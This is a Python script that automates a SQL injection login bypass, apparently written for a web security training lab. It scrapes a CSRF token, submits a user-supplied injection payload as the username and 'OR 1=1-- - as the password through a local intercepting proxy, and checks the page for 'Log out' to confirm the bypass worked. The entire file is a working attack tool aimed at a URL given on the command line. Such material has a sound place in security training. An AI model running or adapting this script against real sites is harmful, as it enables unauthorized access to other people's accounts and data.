import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf(s, url):
	r = s.get(url, verify=False, proxies=proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	csrf = soup.find("input")['value']  #input and value are tags in the request, getting the csrf
	return csrf

def exploit_sqli(s, url, payload):
	csrf = get_csrf(s, url)
	data = {"csrf": csrf, 
			"username":payload,
			"password":"'OR 1=1-- -"}

	r = s.post(url , data=data, verify=False, proxies=proxies)
	res = r.text
	if "Log out" in res:
		return True
	else:
		return False


if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
		sqli_payload = sys.argv[2].strip()
	except IndexError:
		print('[-] Usage: %s <URL> <SQL-Payload>' % sys.argv[0])

	s = requests.Session()

	if exploit_sqli(s, url, sqli_payload):
		print('[+] SQLi successful')
	else:
		print('[-] SQLi failed')
		


